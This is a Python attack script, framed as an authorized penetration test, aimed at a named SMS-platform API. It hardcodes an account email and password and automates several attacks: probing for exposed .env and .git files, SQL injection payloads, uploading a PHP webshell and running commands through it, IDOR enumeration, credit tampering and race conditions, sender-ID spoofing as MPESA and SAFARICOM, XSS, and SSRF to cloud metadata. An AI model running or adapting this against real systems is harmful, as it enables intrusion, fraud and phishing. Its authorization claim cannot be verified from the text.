#!/usr/bin/env python3
"""
OneFone / api.onfonmedia.co.ke - Authorized Security Assessment
Engagement: Cyberdeck Consultants | LOA Ref: api.onfonmedia.co.ke/CTO/LOA/2026/012
Run: pip install requests && python3 sweep.py
"""
import requests, json, time, re, threading
from datetime import datetime
from urllib.parse import urljoin

TARGET     = "https://api.onfonmedia.co.ke"
EMAIL      = "cm4anonymous@gmail.com"
PASSWORD   = "Mwasin254.$"
TIMEOUT    = 15
REPORT_OUT = "onefone_report.html"

SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
    "Accept": "application/json, text/html, */*",
})
FINDINGS = []
RECON    = {}

def url(path): return urljoin(TARGET, path)
def log(tag, msg, c="\033[0m"): print(f"{c}[{datetime.now().strftime('%H:%M:%S')}] [{tag}]\033[0m {msg}")
def ok(m):   log("OK",   m, "\033[92m")
def warn(m): log("WARN", m, "\033[93m")
def crit(m): log("CRIT", m, "\033[91m")
def info(m): log("INFO", m, "\033[94m")
def finding(sev, title, detail, evidence=""):
    FINDINGS.append({"severity":sev,"title":title,"detail":detail,"evidence":evidence,"time":datetime.now().isoformat()})
    (crit if sev in ("CRITICAL","HIGH") else warn)(f"[{sev}] {title}")
def safe_get(path, **kw):
    try: return SESSION.get(url(path), timeout=TIMEOUT, allow_redirects=True, **kw)
    except: return None
def safe_post(path, **kw):
    try: return SESSION.post(url(path), timeout=TIMEOUT, allow_redirects=True, **kw)
    except: return None

def phase_recon():
    info("=" * 60); info("PHASE 1 - RECONNAISSANCE"); info("=" * 60)
    r = safe_get("/")
    if r:
        RECON["headers"] = dict(r.headers)
        info(f"Root -> HTTP {r.status_code}")
        for h in ["Server","X-Powered-By","X-Frame-Options","Content-Security-Policy",
                  "Strict-Transport-Security","X-Content-Type-Options","Access-Control-Allow-Origin"]:
            v = r.headers.get(h)
            if v: info(f"  {h}: {v}")
            else:
                warn(f"  {h}: MISSING")
                if h in ("X-Frame-Options","X-Content-Type-Options","Strict-Transport-Security"):
                    finding("MEDIUM", f"Missing security header: {h}",
                            f"{h} absent", f"GET / headers: {dict(r.headers)}")
        csp = r.headers.get("Content-Security-Policy","")
        if not csp: finding("MEDIUM","No Content-Security-Policy","CSP absent - increases XSS risk")
        elif "unsafe-inline" in csp or "unsafe-eval" in csp:
            finding("MEDIUM","Weak CSP",f"unsafe-inline/eval present: {csp}")
        ot = SESSION.get(url("/"), headers={"Origin":"https://evil.com"}, timeout=TIMEOUT)
        acao = ot.headers.get("Access-Control-Allow-Origin","")
        if acao in ("*", "https://evil.com"):
            finding("HIGH","Reflected CORS",f"ACAO: {acao}")

    sensitive = [
        "/.env","/.env.local","/.env.backup","/.env.production",
        "/.git/HEAD","/.git/config","/.git/COMMIT_EDITMSG","/.git/logs/HEAD",
        "/phpinfo.php","/info.php","/test.php","/debug.php",
        "/config.json","/.DS_Store","/package.json","/composer.json",
        "/wp-config.php","/storage/logs/laravel.log","/logs/error.log",
        "/.htaccess","/web.config",
        "/api/swagger.json","/swagger.json","/api-docs","/openapi.yaml",
    ]
    info(f"Probing {len(sensitive)} sensitive paths...")
    for path in sensitive:
        r = safe_get(path)
        if not r: continue
        if r.status_code == 200:
            body = r.text[:500]
            if any(k in body.lower() for k in ["password","secret","key","token","mysql","redis","db_"]):
                finding("CRITICAL", f"Sensitive file exposed: {path}", "Credential-like content", body)
            else:
                finding("HIGH", f"File accessible: {path}", "HTTP 200 on sensitive path", body[:200])
            crit(f"  {path} -> 200 EXPOSED")
        elif r.status_code == 403:
            warn(f"  {path} -> 403 (exists, blocked)")
            RECON.setdefault("403_paths",[]).append(path)

    dirs = ["/admin","/phpmyadmin","/horizon","/telescope","/backup","/uploads",
            "/storage/app/public","/api/v1","/api/v2","/dashboard",
            "/dashboard/settings","/users","/contacts","/campaigns",
            "/reports","/billing","/payments"]
    RECON["accessible"] = []
    for path in dirs:
        r = safe_get(path)
        if r and r.status_code not in (404,):
            RECON["accessible"].append({"path":path,"status":r.status_code,"len":len(r.text)})
            info(f"  {path} -> {r.status_code} ({len(r.text)}b)")
    ok("Phase 1 complete.")

def phase_auth():
    info("=" * 60); info("PHASE 2 - AUTHENTICATION"); info("=" * 60)
    login_paths = [
        "/api/auth/login","/api/login","/api/v1/auth/login",
        "/api/v1/login","/login","/auth/login","/api/signin",
    ]
    authenticated = False
    for path in login_paths:
        for payload in [{"email":EMAIL,"password":PASSWORD},{"username":EMAIL,"password":PASSWORD}]:
            r = safe_post(path, json=payload, headers={"Content-Type":"application/json"})
            if r and r.status_code in (200,201):
                try:
                    data = r.json()
                    token = (data.get("token") or data.get("access_token") or
                             data.get("data",{}).get("token") or data.get("data",{}).get("access_token"))
                    if token:
                        SESSION.headers["Authorization"] = f"Bearer {token}"
                        RECON["auth_token"] = token
                        ok(f"Authenticated via {path} - token: {token[:50]}...")
                        authenticated = True
                        if "expires_in" in data: info(f"  Expires: {data['expires_in']}s")
                        break
                    else: ok(f"  {path} -> 200 no token: {str(data)[:150]}")
                except: ok(f"  {path} -> 200 non-JSON: {r.text[:150]}")
            elif r and r.status_code == 302:
                loc = r.headers.get("Location","")
                if "login" not in loc and "error" not in loc:
                    ok(f"  Form login {path} -> {loc}"); authenticated = True
            elif r and r.status_code not in (404,405,422):
                info(f"  {path} -> {r.status_code}: {r.text[:100]}")
        if authenticated: break

    info("Testing unauthenticated access to protected endpoints...")
    tmp = SESSION.headers.pop("Authorization",None)
    for path in ["/api/user","/api/contacts","/api/sms","/api/balance","/dashboard/settings"]:
        r = safe_get(path)
        if r and r.status_code == 200 and len(r.text) > 100 and "login" not in r.text.lower():
            finding("CRITICAL","Auth bypass - unauthenticated access",f"{path} returns data without auth",r.text[:500])
    if tmp: SESSION.headers["Authorization"] = tmp

    info("Testing rate limiting...")
    for i in range(6):
        r = safe_post("/api/auth/login", json={"email":EMAIL,"password":"wrong"})
        if not r: break
        if r.status_code == 429: ok(f"  Rate limit after {i+1} attempts"); break
        if i == 5: finding("MEDIUM","No login rate limiting","6 failed attempts, no 429",f"Last: {r.status_code}")

    if not authenticated: warn("Could not authenticate - proceeding unauthenticated")
    ok("Phase 2 complete."); return authenticated

def phase_surface_map():
    info("=" * 60); info("PHASE 3 - SURFACE MAPPING"); info("=" * 60)
    endpoints = [
        "/api/user","/api/users","/api/profile","/api/contacts",
        "/api/sms","/api/sms/send","/api/sms/history","/api/messages",
        "/api/campaigns","/api/balance","/api/wallet","/api/credits",
        "/api/reports","/api/settings","/api/billing","/api/invoices",
        "/api/payments","/api/api-keys","/api/tokens","/api/webhooks",
        "/api/admin","/api/admin/users","/api/export","/api/import",
        "/api/v1/user","/api/v1/sms","/api/v1/contacts","/api/v2/sms",
    ]
    found = []
    for path in endpoints:
        r = safe_get(path)
        if r and r.status_code not in (404,405):
            found.append({"path":path,"status":r.status_code,"len":len(r.text)})
            info(f"  {path} -> {r.status_code} [{r.headers.get('Content-Type','')}] {len(r.text)}b")
    RECON["api_endpoints"] = found
    ok(f"Found {len(found)} responsive endpoints.")

def phase_sqli():
    info("=" * 60); info("PHASE 4 - SQL INJECTION"); info("=" * 60)
    payloads = [
        "'", '"', "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
        "1' AND SLEEP(3)--", "1' AND (SELECT 3000 FROM(SELECT(SLEEP(3)))a)--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    ]
    errors = ["sql syntax","mysql_fetch","ora-","sqlite3","postgresql",
              "syntax error","sqlstate","you have an error in your sql","warning: mysql"]
    params = ["id","user_id","phone","email","q","search","filter","sort","page"]
    endpoints = ["/api/contacts","/api/messages","/api/sms","/api/users","/api/campaigns"]
    for ep in endpoints:
        base = safe_get(ep)
        if not base: continue
        blen = len(base.text)
        for param in params[:5]:
            for payload in payloads:
                r = safe_get(f"{ep}?{param}={requests.utils.quote(payload)}")
                if not r: continue
                if any(e in r.text.lower() for e in errors):
                    finding("CRITICAL","SQLi - Error-based",f"{ep}?{param}={payload}",r.text[:800])
                if "SLEEP" in payload:
                    t0 = time.time()
                    r2 = safe_get(f"{ep}?{param}={requests.utils.quote(payload)}")
                    if time.time()-t0 > 2.5:
                        finding("CRITICAL","SQLi - Time-based blind",f"{ep}?{param}={payload}",f"Delay: {time.time()-t0:.1f}s")
                if "UNION" in payload and abs(len(r.text)-blen) > 200:
                    finding("HIGH","Potential UNION SQLi",f"{ep}?{param}={payload}",r.text[:400])
    ok("Phase 4 complete.")

def phase_file_upload():
    info("=" * 60); info("PHASE 5 - FILE UPLOAD"); info("=" * 60)
    upload_endpoints = [
        "/dashboard/settings","/api/upload","/api/files",
        "/api/import","/api/contacts/import","/upload",
    ]
    php_shell = b"<?php echo shell_exec($_GET['cmd']); ?>"
    js_xss    = b"<script>alert(document.cookie)</script>"
    test_files = [
        ("test.php",       php_shell, "application/x-php",        "PHP webshell"),
        ("test.php.jpg",   php_shell, "image/jpeg",               "Double extension"),
        ("test.PHP",       php_shell, "application/x-php",        "Uppercase extension"),
        ("test.phtml",     php_shell, "application/x-php",        "phtml bypass"),
        ("test.php5",      php_shell, "application/x-php",        "php5 extension"),
        ("test.phar",      php_shell, "application/x-php",        "phar extension"),
        (".htaccess",      b"AddType application/x-httpd-php .jpg","application/octet-stream",".htaccess upload"),
        ("test.svg",       js_xss,    "image/svg+xml",            "SVG XSS"),
        ("test.html",      js_xss,    "text/html",                "HTML XSS"),
        ("contacts.csv",   b'id,name\n=cmd|" /C calc"!A0,test',"text/csv","CSV injection"),
    ]
    for ep in upload_endpoints:
        info(f"Testing {ep}...")
        for fname, content, ctype, desc in test_files:
            try:
                r = SESSION.post(url(ep), files={"file":(fname,content,ctype)}, timeout=TIMEOUT)
                if not r: continue
                if r.status_code in (200,201):
                    paths = re.findall(r'["\']([^"\']*(?:uploads?|files?|storage)[^"\']*)["\']', r.text)
                    if paths:
                        up = paths[0]
                        finding("CRITICAL",f"Upload succeeded: {fname}",f"{desc} at {ep} -> {up}",r.text[:500])
                        crit(f"  UPLOAD: {fname} -> {up}")
                        if any(x in fname for x in [".php",".phtml",".phar"]):
                            shell_r = safe_get(f"{up}?cmd=id")
                            if shell_r and ("uid=" in shell_r.text or "root" in shell_r.text):
                                finding("CRITICAL","RCE CONFIRMED",f"Webshell exec at {up}",shell_r.text[:500])
                                crit(f"  RCE: {up}?cmd=id -> {shell_r.text[:100]}")
                    else:
                        finding("HIGH",f"Upload 200: {fname}",f"{desc} at {ep}",r.text[:300])
                elif r.status_code not in (404,405,415,422):
                    info(f"  {fname} -> {r.status_code}: {r.text[:80]}")
            except: pass
    ok("Phase 5 complete.")

def phase_idor():
    info("=" * 60); info("PHASE 6 - IDOR"); info("=" * 60)
    own_id = None
    r = safe_get("/api/user")
    if r and r.status_code == 200:
        try:
            d = r.json()
            own_id = d.get("id") or d.get("user_id") or d.get("data",{}).get("id")
            info(f"Own ID: {own_id}")
        except: pass
    for pattern in ["/api/users/{id}","/api/contacts/{id}","/api/messages/{id}",
                    "/api/campaigns/{id}","/api/invoices/{id}","/api/payments/{id}"]:
        hits = []
        for tid in range(1,20):
            if own_id and tid == own_id: continue
            r = safe_get(pattern.format(id=tid))
            if r and r.status_code == 200 and len(r.text) > 50:
                hits.append(tid)
                if len(hits)==1:
                    finding("HIGH","IDOR",f"{pattern.format(id=tid)} accessible",r.text[:500])
                    crit(f"  IDOR: {pattern.format(id=tid)}")
        if hits: warn(f"  {pattern}: {len(hits)} IDs accessible: {hits[:10]}")
    for path in ["/api/admin","/api/admin/users","/api/admin/settings","/admin"]:
        r = safe_get(path)
        if r and r.status_code == 200 and len(r.text) > 100:
            finding("HIGH","Admin endpoint accessible",f"{path} -> 200",r.text[:500])
    for path, payload in [
        ("/api/sms/send",{"phone":"+1234567890","message":"t","credits":-1000}),
        ("/api/credits/add",{"amount":999999,"user_id":1}),
    ]:
        r = safe_post(path, json=payload)
        if r and r.status_code in (200,201):
            try:
                d = r.json()
                if "balance" in str(d) or "credits" in str(d):
                    finding("HIGH","Parameter tampering",f"POST {path} accepted tampered payload",r.text[:400])
            except: pass
    ok("Phase 6 complete.")

def phase_credentials():
    info("=" * 60); info("PHASE 7 - CREDENTIAL SCAN"); info("=" * 60)
    patterns = [
        (r"(?i)(api[_-]?key)\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{20,})","API Key"),
        (r"(?i)(secret)\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{20,})","Secret"),
        (r"(?i)(password)\s*[:=]\s*['\"]?([^\s'\"]{8,})","Password"),
        (r"sk-[A-Za-z0-9]{40,}","Stripe/OpenAI Key"),
        (r"AIza[A-Za-z0-9_\-]{35}","Google API Key"),
        (r"mysql://[^@]+:[^@]+@","MySQL DSN"),
        (r"postgres://[^@]+:[^@]+@","Postgres DSN"),
    ]
    for js_path in ["/_next/static/chunks/main.js","/static/js/main.js","/static/js/bundle.js","/app.js"]:
        r = safe_get(js_path)
        if r and r.status_code == 200 and len(r.text) > 100:
            info(f"  JS bundle: {js_path} ({len(r.text)}b)")
            for pat, label in patterns:
                matches = re.findall(pat, r.text)
                if matches: finding("CRITICAL",f"Hardcoded {label} in JS",js_path,str(matches[:3]))
    for path in ["/api/user","/api/settings","/api/profile","/api/integrations"]:
        r = safe_get(path)
        if r and r.status_code == 200:
            for pat, label in patterns:
                if re.findall(pat, r.text):
                    finding("HIGH",f"{label} in API response",path,r.text[:400])
    ok("Phase 7 complete.")

def phase_logic():
    info("=" * 60); info("PHASE 8 - LOGIC FLAWS"); info("=" * 60)
    r = safe_post("/api/credits/add", json={"amount":-99999})
    if r and r.status_code in (200,201):
        finding("HIGH","Negative amount accepted","/api/credits/add accepted -99999",r.text[:300])
    results = []
    def _sms():
        r = safe_post("/api/sms/send",json={"phone":"+254700000000","message":"race"})
        if r: results.append(r.status_code)
    threads = [threading.Thread(target=_sms) for _ in range(10)]
    for t in threads: t.start()
    for t in threads: t.join()
    if results.count(200)+results.count(201) > 1:
        finding("HIGH",f"Race condition - {results.count(200)} concurrent sends","Credit deduction race",str(results))
    for spoof in ["SAFARICOM","MPESA","KRA","BANK","ADMIN"]:
        r = safe_post("/api/sms/send",json={"phone":"+254700000000","message":"t","sender_id":spoof})
        if r and r.status_code in (200,201):
            finding("HIGH",f"Sender ID spoofing: {spoof}",f"Arbitrary sender ID accepted",r.text[:200])
    ok("Phase 8 complete.")

def phase_web():
    info("=" * 60); info("PHASE 9 - WEB VULNS"); info("=" * 60)
    xss = ["<script>alert(1)</script>","<img src=x onerror=alert(1)>","<svg/onload=alert(1)>"]
    for param in ["q","search","name","filter","callback"]:
        for payload in xss:
            r = safe_get(f"/api/search?{param}={requests.utils.quote(payload)}")
            if r and payload in r.text and not r.headers.get("Content-Security-Policy",""):
                finding("HIGH","Reflected XSS",f"/api/search?{param}=...",f"{payload}: {r.text[:200]}")
    for param in ["url","webhook","callback","redirect","image_url"]:
        for target in ["http://127.0.0.1","http://169.254.169.254"]:
            r = safe_get(f"/api/webhooks?{param}={requests.utils.quote(target)}")
            if r and r.status_code == 200 and any(x in r.text for x in ["ami-id","root:x"]):
                finding("CRITICAL","SSRF",f"{param}={target}",r.text[:500])
    for path in ["/logout?redirect=https://evil.com","/login?next=https://evil.com"]:
        r = safe_get(path, allow_redirects=False)
        if r and r.status_code in (301,302,303,307,308) and "evil.com" in r.headers.get("Location",""):
            finding("MEDIUM","Open Redirect",path,r.headers.get("Location",""))
    ok("Phase 9 complete.")

def generate_report():
    so = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    sf = sorted(FINDINGS, key=lambda f: so.get(f["severity"],5))
    counts = {s:sum(1 for f in FINDINGS if f["severity"]==s) for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]}
    sc = {"CRITICAL":"#ff2d2d","HIGH":"#ff6b35","MEDIUM":"#ffd700","LOW":"#4fc3f7","INFO":"#b0bec5"}
    rows = "".join(f"""
    <tr><td><span class="badge" style="background:{sc.get(f['severity'],'#ccc')}">{f['severity']}</span></td>
    <td><strong>{f['title']}</strong><br><small>{f['detail']}</small></td>
    <td><pre class="evidence">{(f['evidence'] or '').replace('<','&lt;').replace('>','&gt;')[:500]}</pre></td>
    <td>{f['time'][11:19]}</td></tr>""" for f in sf)
    p403 = "<br>".join(RECON.get("403_paths",[]) or ["None"])
    api_rows = "".join(f"<tr><td>{e['path']}</td><td>{e['status']}</td><td>{e['len']}b</td></tr>" for e in RECON.get("api_endpoints",[]))
    html = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>Security Report - api.onfonmedia.co.ke</title>
<style>:root{{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#e6edf3;--muted:#8b949e;--accent:#00ff9f}}
*{{box-sizing:border-box;margin:0;padding:0}}body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',sans-serif;padding:2rem}}
h1{{color:var(--accent);font-size:1.8rem;margin-bottom:.3rem}}.meta{{color:var(--muted);font-size:.85rem;margin-bottom:2rem}}
.grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:1rem;margin-bottom:2rem}}
.stat{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1rem;text-align:center}}
.stat .num{{font-size:2rem;font-weight:700}}.stat .lbl{{font-size:.8rem;color:var(--muted);text-transform:uppercase}}
.section{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1.5rem;margin-bottom:2rem}}
.section h2{{color:var(--accent);margin-bottom:1rem;font-size:1.1rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}}
table{{width:100%;border-collapse:collapse;font-size:.9rem}}th{{text-align:left;padding:.6rem;border-bottom:1px solid var(--border);color:var(--muted)}}
td{{padding:.7rem .6rem;border-bottom:1px solid var(--border);vertical-align:top}}
.badge{{padding:.2rem .6rem;border-radius:4px;font-size:.75rem;font-weight:700;color:#000}}
pre.evidence{{background:#0a0c10;padding:.6rem;border-radius:4px;font-size:.75rem;white-space:pre-wrap;word-break:break-all;color:#79c0ff;max-height:100px;overflow-y:auto}}
footer{{text-align:center;color:var(--muted);font-size:.8rem;margin-top:2rem}}</style></head><body>
<h1>Security Assessment Report</h1>
<p class="meta">Target: <strong>api.onfonmedia.co.ke</strong> | Engagement: <strong>Cyberdeck Consultants</strong> | LOA: <strong>api.onfonmedia.co.ke/CTO/LOA/2026/012</strong> | Date: <strong>{datetime.now().strftime('%Y-%m-%d %H:%M UTC')}</strong></p>
<div class="grid">
<div class="stat"><div class="num" style="color:#ff2d2d">{counts['CRITICAL']}</div><div class="lbl">Critical</div></div>
<div class="stat"><div class="num" style="color:#ff6b35">{counts['HIGH']}</div><div class="lbl">High</div></div>
<div class="stat"><div class="num" style="color:#ffd700">{counts['MEDIUM']}</div><div class="lbl">Medium</div></div>
<div class="stat"><div class="num" style="color:#4fc3f7">{counts['LOW']}</div><div class="lbl">Low</div></div>
<div class="stat"><div class="num" style="color:var(--accent)">{len(FINDINGS)}</div><div class="lbl">Total</div></div>
</div>
<div class="section"><h2>Recon Summary</h2><p><strong>403 paths (exist, blocked):</strong> {p403}</p><br>
<table><tr><th>Path</th><th>Status</th><th>Size</th></tr>{api_rows or "<tr><td colspan=3>None</td></tr>"}</table></div>
<div class="section"><h2>Findings ({len(FINDINGS)} total)</h2>
<table><thead><tr><th>Severity</th><th>Finding</th><th>Evidence</th><th>Time</th></tr></thead>
<tbody>{rows or "<tr><td colspan=4 style='text-align:center;color:#8b949e'>No findings</td></tr>"}</tbody></table></div>
<div class="section"><h2>Recommendations</h2><table><thead><tr><th>Priority</th><th>Action</th></tr></thead><tbody>
<tr><td><span class="badge" style="background:#ff2d2d">IMMEDIATE</span></td><td>Restrict .env and .git at web root (nginx: deny access to dot-files)</td></tr>
<tr><td><span class="badge" style="background:#ff2d2d">IMMEDIATE</span></td><td>Server-side file type validation on all upload endpoints</td></tr>
<tr><td><span class="badge" style="background:#ff6b35">HIGH</span></td><td>Add X-Frame-Options, X-Content-Type-Options, HSTS, CSP headers</td></tr>
<tr><td><span class="badge" style="background:#ff6b35">HIGH</span></td><td>Rate limit authentication endpoints</td></tr>
<tr><td><span class="badge" style="background:#ffd700">MEDIUM</span></td><td>Audit all API endpoints for IDOR (object-level authorization)</td></tr>
<tr><td><span class="badge" style="background:#ffd700">MEDIUM</span></td><td>Reject negative values in all financial operations</td></tr>
<tr><td><span class="badge" style="background:#ffd700">MEDIUM</span></td><td>Restrict CORS to known origins</td></tr>
<tr><td><span class="badge" style="background:#4fc3f7">LOW</span></td><td>Whitelist sender IDs - block MPESA/SAFARICOM/KRA spoofing</td></tr>
</tbody></table></div>
<footer>CONFIDENTIAL - Authorized Assessment | Cyberdeck Consultants x api.onfonmedia.co.ke<br>All findings require manual verification before disclosure</footer>
</body></html>"""
    with open(REPORT_OUT,"w") as f: f.write(html)
    ok(f"Report: {REPORT_OUT}")

if __name__ == "__main__":
    print("\033[92m" + "="*60)
    print("  ONEFONE SECURITY ASSESSMENT")
    print("  Target: api.onfonmedia.co.ke")
    print("  Cyberdeck Consultants | LOA/2026/012")
    print("="*60 + "\033[0m")
    phase_recon()
    phase_auth()
    phase_surface_map()
    phase_sqli()
    phase_file_upload()
    phase_idor()
    phase_credentials()
    phase_logic()
    phase_web()
    generate_report()
    print("\n\033[92m" + "="*60)
    print(f"  COMPLETE - {len(FINDINGS)} findings")
    so = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    for f in sorted(FINDINGS, key=lambda x: so.get(x["severity"],5)):
        c = {"CRITICAL":"\033[91m","HIGH":"\033[91m","MEDIUM":"\033[93m"}.get(f["severity"],"\033[0m")
        print(f"  {c}[{f['severity']}]\033[0m {f['title']}")
    print(f"\n  Report: {REPORT_OUT}\n" + "="*60 + "\033[0m")
